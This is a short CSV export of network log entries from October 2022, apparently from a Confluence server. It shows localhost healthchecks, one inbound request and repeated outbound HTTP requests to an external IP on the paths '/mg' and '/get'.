"@timestamp","network.direction","source.ip","source.port","destination.port","destination.ip","bytes_in","bytes_out","network.protocol","url.path","url.full"
"Oct 25, 2022 @ 01:21:19.904",ingress,"127.0.0.1",43728,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:21:04.601",egress,"172.17.0.3",41372,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:20:49.893",ingress,"127.0.0.1",40864,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:20:25.769",egress,"172.17.0.3",59528,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:20:19.878",ingress,"127.0.0.1",39888,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:20:03.933",egress,"172.17.0.3",51214,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:19:49.864",ingress,"127.0.0.1",54604,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:19:19.854",ingress,"127.0.0.1",47022,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:19:03.262",egress,"172.17.0.3",41714,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:18:55.098",egress,"172.17.0.3",46872,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:18:49.830",ingress,"127.0.0.1",50230,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:18:35.119",ingress,"23.251.102.74",56572,8090,"172.17.0.3",204B,"65.9KB",http,"/","http://34.142.184.1:8090/"
